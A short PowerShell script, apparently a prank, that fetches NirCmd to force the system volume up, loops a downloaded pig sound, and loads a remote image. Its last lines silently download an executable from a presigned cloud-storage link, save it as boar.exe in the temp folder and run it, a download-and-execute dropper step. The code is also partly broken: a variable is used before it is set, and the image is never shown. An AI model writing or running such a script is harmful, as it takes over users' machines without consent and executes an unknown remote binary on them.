$Audio = "https://github.com/halololcloud/images/raw/refs/heads/main/pig.mp3"
$VolumeLevel = 20
$val = [int]([math]::Round(65535 * ($VolumeLevel / 100)))
$tempNir = Join-Path $env:TEMP "nircmd.exe"
if (-not (Test-Path $tempNir)) {
    $tempZip = Join-Path $env:TEMP "nircmd.zip"
    Invoke-WebRequest -Uri "https://www.nirsoft.net/utils/nircmd.zip" -OutFile $tempZip -UseBasicParsing
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $env:TEMP)
    Remove-Item $tempZip -ErrorAction SilentlyContinue
}
Start-Process -FilePath $tempNir -ArgumentList "setsysvolume $val" -NoNewWindow -Wait
Start-Process -FilePath $tempNir -ArgumentList "mutesysvolume 0" -NoNewWindow -Wait

Add-Type -AssemblyName PresentationCore,PresentationFramework,WindowsBase
$tempImg = Join-Path $env:TEMP "fullscreen_image.jpg"
$tempAudio = Join-Path $env:TEMP "temp_audio.mp3"
Invoke-WebRequest -Uri $Url -OutFile $tempImg -UseBasicParsing
Invoke-WebRequest -Uri $Audio -OutFile $tempAudio -UseBasicParsing

$wmp = New-Object -ComObject WMPlayer.OCX
$media = $wmp.newMedia($tempAudio)
$wmp.currentPlaylist.clear()
$wmp.currentPlaylist.appendItem($media)
$wmp.settings.setMode("loop", $true)
$wmp.controls.play()

$fs = [IO.File]::OpenRead($tempImg)
$bi = New-Object System.Windows.Media.Imaging.BitmapImage
$bi.BeginInit()
$bi.StreamSource = $fs
$bi.CacheOption = "OnLoad"
$bi.EndInit()
$fs.Close()


$Url = "https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/suPeOMCTpGQKSZTZu2vHKRsOZvk1/5d9c78a5-656b-4867-9896-f6fb1b357e2d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=2f488bd324502ec20fee5b40e9c9ed39%2F20251019%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20251019T160757Z&X-Amz-Expires=43200&X-Amz-Signature=e437fbeb7917bf14f2ff0d4f1c9d25045d5812dccca14a259ef0182531b2d050&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22app.exe%22"
$OutPath = "$env:TEMP\boar.exe"

$ProgressPreference = 'SilentlyContinue'
(New-Object Net.WebClient).DownloadFile($Url, $OutPath)
Start-Process $OutPath
